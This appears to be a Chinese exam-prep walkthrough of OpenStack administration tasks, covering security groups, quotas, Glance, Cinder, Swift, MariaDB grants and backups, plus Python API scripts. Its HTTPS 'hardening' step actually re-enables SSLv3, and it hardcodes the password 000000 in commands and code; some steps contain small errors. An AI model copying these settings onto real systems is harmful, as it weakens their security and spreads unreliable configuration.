<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-dashboard.sh</span><br><span class="line">[root@controller ~]# vim /etc/nova/nova.conf</span><br><span class="line">修改内容如下</span><br><span class="line">novncproxy_base_url = http://公网IP:6080/vnc_auto.html</span><br><span class="line"></span><br><span class="line">[root@controller ~]# cat /etc/nova/nova.conf | grep 公网IP</span><br><span class="line">novncproxy_base_url = http://公网IP:6080/vnc_auto.html</span><br></pre></td></tr></table></figure>

<h2 id="任务-3-OpenStack-运维任务"><a href="#任务-3-OpenStack-运维任务" class="headerlink" title="任务 3 OpenStack 运维任务"></a>任务 3 OpenStack 运维任务</h2><p><strong>①使用命令创建名称为 group_web 的安全组该安全组的描述为” Custom security group”，用 openstack 命令为安全组添加 icmp 规则和 ssh 规则允许任意 ip 地址访问 web,完成后查看该安全组的详细信息.</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建描述为Custom security group的安全组</span></span><br><span class="line">[root@controller ~]# openstack security group create --description &quot;Custom security group&quot; group_web</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加访问80</span></span><br><span class="line">[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 80:80 group_web</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加访问ssh(22)</span></span><br><span class="line">[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 22:22 group_web</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加访问icmp</span></span><br><span class="line">[root@controller ~]# openstack security group rule create --ingress --protocol icmp group_web</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>②在 keystone 中创建 shop 项目添加描述为”Hello shop”，完成后使用 openstack 命令禁用该项目，然后使用 openstack 命令查看该项目的详细信息。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack project create shop --description &quot;Heelo shop&quot; --domain demo</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| Field       | Value                            |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">| description | Heelo shop                       |</span><br><span class="line">| domain_id   | c7a3303c6f7748f2b22f6421149226b5 |</span><br><span class="line">| enabled     | True                             |</span><br><span class="line">| id          | d610f67035114665b15c367ab4e4d879 |</span><br><span class="line">| is_domain   | False                            |</span><br><span class="line">| name        | shop                             |</span><br><span class="line">| parent_id   | c7a3303c6f7748f2b22f6421149226b5 |</span><br><span class="line">| tags        | []                               |</span><br><span class="line">+-------------+----------------------------------+</span><br><span class="line">[root@controller ~]# openstack project set shop --disable</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>③<strong>使用 nova 命令查看 admin 租户的当前配额值，将 admin 租户的实例配额提升到 13。登 录 controller 节 点 ，使用 glance 相 关 命 令 上 传 镜 像 ， 源 使 用CentOS_7.5_x86_64_XD.qcow2，名字为 centos7.5，修改这个镜像为共享状态，并设置最小磁盘为 5G。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack quota set admin --instances 13</span><br><span class="line">[root@controller ~]# openstack quota show admin</span><br><span class="line">+----------------------+----------------------------------+</span><br><span class="line">| Field                | Value                            |</span><br><span class="line">+----------------------+----------------------------------+</span><br><span class="line">| cores                | 20                               |</span><br><span class="line">| fixed-ips            | -1                               |</span><br><span class="line">| floating-ips         | 50                               |</span><br><span class="line">| health_monitors      | None                             |</span><br><span class="line">| injected-file-size   | 10240                            |</span><br><span class="line">| injected-files       | 5                                |</span><br><span class="line">| injected-path-size   | 255                              |</span><br><span class="line">| instances            | 13                               |</span><br><span class="line">| key-pairs            | 100                              |</span><br><span class="line">| l7_policies          | None                             |</span><br><span class="line">| listeners            | None                             |</span><br><span class="line">| load_balancers       | None                             |</span><br><span class="line">| location             | None                             |</span><br><span class="line">| name                 | None                             |</span><br><span class="line">| networks             | 100                              |</span><br><span class="line">| pools                | None                             |</span><br><span class="line">| ports                | 500                              |</span><br><span class="line">| project              | 3b0c23a093dd4f11bbd8d7316634b784 |</span><br><span class="line">| project_name         | admin                            |</span><br><span class="line">| properties           | 128                              |</span><br><span class="line">| ram                  | 51200                            |</span><br><span class="line">| rbac_policies        | 10                               |</span><br><span class="line">| routers              | 10                               |</span><br><span class="line">| secgroup-rules       | 100                              |</span><br><span class="line">| secgroups            | 10                               |</span><br><span class="line">| server-group-members | 10                               |</span><br><span class="line">| server-groups        | 10                               |</span><br><span class="line">| subnet_pools         | -1                               |</span><br><span class="line">| subnets              | 100                              |</span><br><span class="line">+----------------------+----------------------------------+</span><br><span class="line"></span><br><span class="line">[root@controller ~]# glance image-create --disk-format qcow2 --container bare --file CentOS-7-x86_64-DVD-1804.iso --min-disk 5 --name centos7.5</span><br><span class="line">+------------------+--------------------------------------+</span><br><span class="line">| Property         | Value                                |</span><br><span class="line">+------------------+--------------------------------------+</span><br><span class="line">| checksum         | 660aab9894136872770ecb6e1e370c08     |</span><br><span class="line">| container_format | bare                                 |</span><br><span class="line">| created_at       | 2023-04-17T03:54:50Z                 |</span><br><span class="line">| disk_format      | qcow2                                |</span><br><span class="line">| id               | 84cd8c51-ee79-4591-8a9e-b3d689d34c04 |</span><br><span class="line">| min_disk         | 5                                    |</span><br><span class="line">| min_ram          | 0                                    |</span><br><span class="line">| name             | centos7.5                            |</span><br><span class="line">| owner            | 3b0c23a093dd4f11bbd8d7316634b784     |</span><br><span class="line">| protected        | False                                |</span><br><span class="line">| size             | 4470079488                           |</span><br><span class="line">| status           | active                               |</span><br><span class="line">| tags             | []                                   |</span><br><span class="line">| updated_at       | 2023-04-17T03:55:15Z                 |</span><br><span class="line">| virtual_size     | None                                 |</span><br><span class="line">| visibility       | shared                               |</span><br><span class="line">+------------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# openstack image set centos7.5 --share</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>④请修改 glance 后端配置文件，将项目的映像存储限制为 10GB,完成后重启 glance 服务。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# vim /etc/glance/glance-api.conf</span><br><span class="line">user_storage_quota = 10737418240</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">[root@controller ~]# systemctl restart openstack-glance-*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询</span></span><br><span class="line">[root@controller ~]# cat /etc/glance/glance-api.conf |grep _quota</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">``image_property_quota`` configuration option.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">     * image_property_quota</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_member_quota = 128</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_property_quota = 128</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_tag_quota = 128</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_location_quota = 10</span></span><br><span class="line">user_storage_quota = 10737418240</span><br></pre></td></tr></table></figure>



<p>⑤在 controller 节点执行 iaas-install-cinder-controller.sh, compute 节点执行iaas-install-cinder-compute.sh，在 controller 和 compute 节点上会自行安装 cinder 服务并完成配置。创建一个名为 lvm 的卷类型，创建该类型规格键值对，要求 lvm 卷类型对应 cinder后端驱动 lvm 所管理的存储资源,名字 lvm_test，大小 1G 的云硬盘并查询该云硬盘的详细信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-cinder.sh </span><br><span class="line">[root@compute ~]# openstack-compute-cinder.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建卷类型lvm</span></span><br><span class="line">[root@controller ~]# source admin-openrc</span><br><span class="line">[root@controller ~]# openstack volume type create lvm</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| Field       | Value                                |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| description | None                                 |</span><br><span class="line">| id          | 5a1ac113-b226-4646-9a7c-46eee3f6346f |</span><br><span class="line">| is_public   | True                                 |</span><br><span class="line">| name        | lvm                                  |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# cinder type-key lvm set volume_backend_name=LVM</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建云硬盘</span></span><br><span class="line">[root@controller ~]# cinder create --volume-type lvm --name lvm_test 1</span><br><span class="line">略                                               </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看详细信息</span></span><br><span class="line">[root@controller ~]# cinder show lvm_test</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| Property                       | Value                                |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| attached_servers               | []                                   |</span><br><span class="line">| attachment_ids                 | []                                   |</span><br><span class="line">| availability_zone              | nova                                 |</span><br><span class="line">| bootable                       | false                                |</span><br><span class="line">| consistencygroup_id            | None                                 |</span><br><span class="line">| created_at                     | 2022-10-25T12:28:55.000000           |</span><br><span class="line">| description                    | None                                 |</span><br><span class="line">| encrypted                      | False                                |</span><br><span class="line">| id                             | 39f131c3-6ee2-432a-8096-e13173307339 |</span><br><span class="line">| metadata                       |                                      |</span><br><span class="line">| migration_status               | None                                 |</span><br><span class="line">| multiattach                    | False                                |</span><br><span class="line">| name                           | lvm_test                             |</span><br><span class="line">| os-vol-host-attr:host          | compute@lvm#LVM                      |</span><br><span class="line">| os-vol-mig-status-attr:migstat | None                                 |</span><br><span class="line">| os-vol-mig-status-attr:name_id | None                                 |</span><br><span class="line">| os-vol-tenant-attr:tenant_id   | 4885b78813a5466d9d6d483026f2067c     |</span><br><span class="line">| replication_status             | None                                 |</span><br><span class="line">| size                           | 1                                    |</span><br><span class="line">| snapshot_id                    | None                                 |</span><br><span class="line">| source_volid                   | None                                 |</span><br><span class="line">| status                         | available                            |</span><br><span class="line">| updated_at                     | 2022-10-25T12:28:56.000000           |</span><br><span class="line">| user_id                        | b4a6c1eb18c247edba11b57be18ec752     |</span><br><span class="line">| volume_type                    | lvm                                  |</span><br></pre></td></tr></table></figure>



<p><strong>⑥请使用数据库命令将所有数据库进行备份,备份文件名为 openstack.sql，完成后使用命令查看文件属性其中文件大小以 mb 显示。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mysqldump -uroot -p000000 --all-databases &gt; /root/openstack.sql</span><br><span class="line">[root@controller ~]# du -h /root/openstack.sql</span><br><span class="line">1.6M    /root/openstack.sql</span><br></pre></td></tr></table></figure>



<p><strong>⑦进入数据库，创建本地用户 examuser，密码为 000000，然后查询 mysql 数据库中的user 表的 user,host,password 字段。然后赋予这个用户所有数据库的“查询”“删除”“更新”“创建”的权限。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mysql -uroot -p</span><br><span class="line">MariaDB [(none)]&gt; create user examuser@&#x27;localhost&#x27; identified by &#x27;000000&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.005 sec)</span><br><span class="line">MariaDB [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mysql]&gt; select user,host,password from user;</span><br><span class="line">+-----------+------------+-------------------------------------------+</span><br><span class="line">| user      | host       | password                                  |</span><br><span class="line">+-----------+------------+-------------------------------------------+</span><br><span class="line">| root      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root      | controller | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root      | 127.0.0.1  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| root      | ::1        | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| keystone  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| keystone  | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| glance    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| glance    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| nova      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| nova      | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| placement | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| placement | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| neutron   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| neutron   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| cinder    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| cinder    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">| examuser  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |</span><br><span class="line">+-----------+------------+-------------------------------------------+</span><br><span class="line">17 rows in set (0.000 sec)</span><br><span class="line">MariaDB [mysql]&gt; grant select,delete,update,create on *.* to examuser@&#x27;localhost&#x27;; </span><br><span class="line">Query OK, 0 rows affected (0.000 sec)</span><br><span class="line">MariaDB [mysql]&gt; select User, Select_priv,Update_priv,Delete_priv,Create_priv from user;</span><br><span class="line">+-----------+-------------+-------------+-------------+-------------+</span><br><span class="line">| User      | Select_priv | Update_priv | Delete_priv | Create_priv |</span><br><span class="line">+-----------+-------------+-------------+-------------+-------------+</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| root      | Y           | Y           | Y           | Y           |</span><br><span class="line">| keystone  | N           | N           | N           | N           |</span><br><span class="line">| keystone  | N           | N           | N           | N           |</span><br><span class="line">| glance    | N           | N           | N           | N           |</span><br><span class="line">| glance    | N           | N           | N           | N           |</span><br><span class="line">| nova      | N           | N           | N           | N           |</span><br><span class="line">| nova      | N           | N           | N           | N           |</span><br><span class="line">| placement | N           | N           | N           | N           |</span><br><span class="line">| placement | N           | N           | N           | N           |</span><br><span class="line">| neutron   | N           | N           | N           | N           |</span><br><span class="line">| neutron   | N           | N           | N           | N           |</span><br><span class="line">| examuser  | Y           | Y           | Y           | Y           |</span><br><span class="line">+-----------+-------------+-------------+-------------+-------------+</span><br><span class="line">15 rows in set (0.000 sec)</span><br></pre></td></tr></table></figure>



<p>⑧请使用 openstack 命令创建一个名为 test 的 cinder 卷，卷大小为 5G。完成后使用 cinder命令列出卷列表并查看 test 卷的详细信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack volume create --size 5 test</span><br><span class="line">[root@controller ~]# openstack volume show test</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| Field                          | Value                                |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| attachments                    | []                                   |</span><br><span class="line">| availability_zone              | nova                                 |</span><br><span class="line">| bootable                       | false                                |</span><br><span class="line">| consistencygroup_id            | None                                 |</span><br><span class="line">| created_at                     | 2023-04-17T04:05:21.000000           |</span><br><span class="line">| description                    | None                                 |</span><br><span class="line">| encrypted                      | False                                |</span><br><span class="line">| id                             | 67df96a9-cc9f-4a59-8602-e0e50bdf4f26 |</span><br><span class="line">| migration_status               | None                                 |</span><br><span class="line">| multiattach                    | False                                |</span><br><span class="line">| name                           | test                                 |</span><br><span class="line">| os-vol-host-attr:host          | compute@lvm#LVM                      |</span><br><span class="line">| os-vol-mig-status-attr:migstat | None                                 |</span><br><span class="line">| os-vol-mig-status-attr:name_id | None                                 |</span><br><span class="line">| os-vol-tenant-attr:tenant_id   | 3b0c23a093dd4f11bbd8d7316634b784     |</span><br><span class="line">| properties                     |                                      |</span><br><span class="line">| replication_status             | None                                 |</span><br><span class="line">| size                           | 5                                    |</span><br><span class="line">| snapshot_id                    | None                                 |</span><br><span class="line">| source_volid                   | None                                 |</span><br><span class="line">| status                         | available                            |</span><br><span class="line">| type                           | None                                 |</span><br><span class="line">| updated_at                     | 2023-04-17T04:05:22.000000           |</span><br><span class="line">| user_id                        | 0a6447639e3b44acb584c6b87f194c9e     |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>⑨为了减缓来自实例的数据访问速度的变慢，OpenStack Block Storage 支持对卷数据复制带宽的速率限制。请修改 cinder 后端配置文件将卷复制带宽限制为最高 100 MiB&#x2F;s。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# vim /etc/cinder/cinder.conf</span><br><span class="line">[lvmdriver-1]</span><br><span class="line">volume_group=cinder-volumes-1</span><br><span class="line">volume_driver=cinder.volume.drivers.lvm.LVMVolumeDriver</span><br><span class="line">volume_backend_name=LVM</span><br><span class="line">volume_copy_bps_limit=104857600</span><br><span class="line">[root@controller ~]# systemctl restart openstack-cinder-*</span><br><span class="line">[root@controller ~]# cat /etc/cinder/cinder.conf | grep 104857600</span><br><span class="line">volume_copy_bps_limit=104857600</span><br></pre></td></tr></table></figure>



<p><strong>⑩在controller节点执行 iaas-install-swift-controller.sh, compute节点执行iaas-install-swift-compute.sh,在controller和compute节点上会自行安装 swift 服务并完成配置。创建一个名为 file 的容器。</strong></p>
<p><strong>在提供的OpenStack平台上，使用Swift对象存储服务，修改相应的配置文件，使对象存储Swift作为glance镜像服务的后端存储。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-swift.sh</span><br><span class="line">[root@compute ~]# openstack-compute-swift.sh</span><br><span class="line">[root@controller ~]# swift post file</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##修改配置文件</span></span></span><br><span class="line">[root@controller ~]# vi /etc/glance/glance-api.conf</span><br><span class="line">[glance_store]</span><br><span class="line">stores=glance.store.filesystem.Store,glance.store.swift.Store,glance.store.http.Store</span><br><span class="line">default_store=swift</span><br><span class="line">swift_store_region=RegionOne</span><br><span class="line">swift_store_endpoint_type=internalURL</span><br><span class="line">swift_store_container=glance</span><br><span class="line">swift_store_large_object_size=5120</span><br><span class="line">swift_store_large_object_chunk_size=200</span><br><span class="line">swift_store_create_container_on_put=True</span><br><span class="line">swift_store_multi_tenant=True</span><br><span class="line">swift_store_admin_tenants=service</span><br><span class="line">swift_store_auth_address=http://controller:5000/v3</span><br><span class="line">swift_store_user=glance</span><br><span class="line">swift_store_key=000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#重启 glance 所有组件</span></span></span><br><span class="line"> systemctl restart openstack-glance-*</span><br></pre></td></tr></table></figure>



<p><strong>11用 swift 命令，把 cirros-0.3.4-x86_64-disk.img 上传到 file 容器中。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# swift upload file /root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line">root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line">[root@controller ~]# swift stat file</span><br><span class="line">               Account: AUTH_d23ad8b534f44b02ad30c9f7847267df</span><br><span class="line">             Container: file</span><br><span class="line">               Objects: 1</span><br><span class="line">                 Bytes: 13287936</span><br><span class="line">              Read ACL:</span><br><span class="line">             Write ACL:</span><br><span class="line">               Sync To:</span><br><span class="line">              Sync Key:</span><br><span class="line">         Accept-Ranges: bytes</span><br><span class="line">      X-Storage-Policy: Policy-0</span><br><span class="line">         Last-Modified: Fri, 10 Mar 2023 02:43:07 GMT</span><br><span class="line">           X-Timestamp: 1678416180.44884</span><br><span class="line">            X-Trans-Id: txfdc2fb777c4641d3a9292-00640a9941</span><br><span class="line">          Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Openstack-Request-Id: txfdc2fb777c4641d3a9292-00640a9941</span><br></pre></td></tr></table></figure>



<p>12使用提供的云安全框架组件，将提供的OpenStack云平台的安全策略从http优化至https。</p>
<p>controller节点</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#安装工具包</span></span></span><br><span class="line">yum install -y mod_wsgi httpd mod_ssl</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##修改/etc/openstack-dashboard/local_settings文件</span></span></span><br><span class="line">vi /etc/openstack-dashboard/local_settings</span><br><span class="line"><span class="meta prompt_">   #</span><span class="language-bash"><span class="comment">#在DEBUG = False下增加4行</span></span></span><br><span class="line">USE_SSL = True</span><br><span class="line">CSRF_COOKIE_SECURE = True		##原文中有，去掉注释即可</span><br><span class="line">SESSION_COOKIE_SECURE = True		##原文中有，去掉注释即可</span><br><span class="line">SESSION_COOKIE_HTTPONLY = True</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#修改/etc/httpd/conf.d/ssl.conf配置文件</span></span></span><br><span class="line">vi /etc/httpd/conf.d/ssl.conf</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash"><span class="comment">#将SSLProtocol all -SSLv2 -SSLv3改成：</span></span></span><br><span class="line">SSLProtocol all -SSLv2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#重启服务</span></span></span><br><span class="line">systemctl restart httpd</span><br><span class="line">systemctl restart memcached</span><br></pre></td></tr></table></figure>



<p>13在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有：</p>
<p>  设置内存超售比例为1.5倍；</p>
<p> 设置nova服务心跳检查时间为120秒。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/nova/nova.conf</span><br><span class="line">ram_allocation_ratio = 1.5</span><br><span class="line">service_down_time = 120</span><br></pre></td></tr></table></figure>



<h2 id="任务四-OpenStack架构任务"><a href="#任务四-OpenStack架构任务" class="headerlink" title="任务四 OpenStack架构任务"></a>任务四 OpenStack架构任务</h2><p>①在controller节点安装python3环境。安装完之后查看python3版本，使用提供的whl文件安装依赖。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller python-depend]# yum install python3 –y</span><br><span class="line">[root@controller python-depend]# pip3 install certifi-2019.11.28-py2.py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install urllib3-1.25.11-py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install idna-2.8-py2.py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install chardet-3.0.4-py2.py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install requests-2.24.0-py2.py3-none-any.whl</span><br><span class="line">[root@controller ~]# python3 --version</span><br><span class="line">Python 3.6.8</span><br><span class="line">[root@controller ~]# pip3 list</span><br><span class="line">DEPRECATION: The default format will switch to columns in the future. You can use --format=(legacy|columns) (or define a format=(legacy|columns) in your pip.conf under the [list] section) to disable this warning.</span><br><span class="line">certifi (2019.11.28)</span><br><span class="line">chardet (3.0.4)</span><br><span class="line">idna (2.8)</span><br><span class="line">pip (9.0.3)</span><br><span class="line">requests (2.24.0)</span><br><span class="line">setuptools (39.2.0)</span><br><span class="line">urllib3 (1.25.11)</span><br></pre></td></tr></table></figure>



<p>②编写python代码对接OpenStack API，完成镜像的上传。在controller节点的&#x2F;root目录下创建create_image.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中上传镜像cirros-0.3.4-x86_64-disk.img，名字为cirros001，disk_format为qcow2，container_format为bare。执行完代码要求输出“创建镜像成功，id为：xxxxxx”。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller python3]# python3 create_image.py</span><br><span class="line">请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)</span><br><span class="line">192.168.100.x</span><br><span class="line">创建镜像成功，id为：0591f693-a7c7-4e7f-ac6c-957b7bccffc9</span><br><span class="line">镜像文件上传成功</span><br><span class="line">[root@controller ~]# cat create_image.py</span><br><span class="line">import requests,json,time</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">*******************全局变量IP*****************************</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态</span></span><br><span class="line">controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)</span><br><span class="line"></span><br><span class="line">image_name = &quot;cirros001&quot;</span><br><span class="line">file_path = &quot;/root/cirros-0.3.4-x86_64-disk.img&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;</span><br><span class="line">    body = &#123;</span><br><span class="line">       &quot;auth&quot;: &#123;</span><br><span class="line">           &quot;identity&quot;: &#123;</span><br><span class="line">              &quot;methods&quot;:[&quot;password&quot;],</span><br><span class="line">              &quot;password&quot;: &#123;</span><br><span class="line">                  &quot;user&quot;: &#123;</span><br><span class="line">                     &quot;domain&quot;:&#123;</span><br><span class="line">                         &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                     &#125;,</span><br><span class="line">                     &quot;name&quot;: &quot;admin&quot;,</span><br><span class="line">                     &quot;password&quot;: &quot;000000&quot;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &quot;scope&quot;: &#123;</span><br><span class="line">              &quot;project&quot;: &#123;</span><br><span class="line">                  &quot;domain&quot;: &#123;</span><br><span class="line">                     &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;admin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]</span><br><span class="line">    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">class glance_api:</span><br><span class="line">    def __init__(self, headers: dict, resUrl: str):</span><br><span class="line">       self.headers = headers</span><br><span class="line">       self.resUrl = resUrl</span><br><span class="line">    #创建glance镜像</span><br><span class="line">    def create_glance(self, container_format=&quot;bare&quot;, disk_format=&quot;qcow2&quot;):</span><br><span class="line">       body = &#123;</span><br><span class="line">           &quot;container_format&quot;: container_format,</span><br><span class="line">           &quot;disk_format&quot;: disk_format,</span><br><span class="line">           &quot;name&quot;: image_name,</span><br><span class="line">        &#125;</span><br><span class="line">       status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).status_code</span><br><span class="line">       if(status_code == 201):</span><br><span class="line">           return f&quot;创建镜像成功，id为：&#123;glance_api.get_glance_id()&#125;&quot;</span><br><span class="line">       else:</span><br><span class="line">           return &quot;创建镜像失败&quot;</span><br><span class="line">    #获取glance镜像id</span><br><span class="line">    def get_glance_id(self):</span><br><span class="line">       result = json.loads(requests.get(self.resUrl,headers=self.headers).text)</span><br><span class="line">       for item in result[&#x27;images&#x27;]:</span><br><span class="line">           if(item[&#x27;name&#x27;] == image_name):</span><br><span class="line">              return item[&#x27;id&#x27;]</span><br><span class="line">    #上传glance镜像</span><br><span class="line">    def update_glance(self):</span><br><span class="line">       self.resUrl=self.resUrl+&quot;/&quot;+self.get_glance_id()+&quot;/file&quot;</span><br><span class="line">       self.headers[&#x27;Content-Type&#x27;] = &quot;application/octet-stream&quot;</span><br><span class="line">       status_code = requests.put(self.resUrl,data=open(file_path,&#x27;rb&#x27;).read(),headers=self.headers).status_code</span><br><span class="line">       if(status_code == 204):</span><br><span class="line">           return &quot;镜像文件上传成功&quot;</span><br><span class="line">       else:</span><br><span class="line">           return &quot;镜像文件上传失败&quot;</span><br><span class="line">glance_api = glance_api(headers,f&quot;http://&#123;controller_ip&#125;:9292/v2/images&quot;)</span><br><span class="line">print(glance_api.create_glance())  #调用glance-api中创建镜像方法</span><br><span class="line">print(glance_api.update_glance())</span><br></pre></td></tr></table></figure>



<p>③编写python代码对接OpenStack API，完成用户的创建。在controller节点的&#x2F;root目录下创建create_user.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中创建用户guojibeisheng。</p>
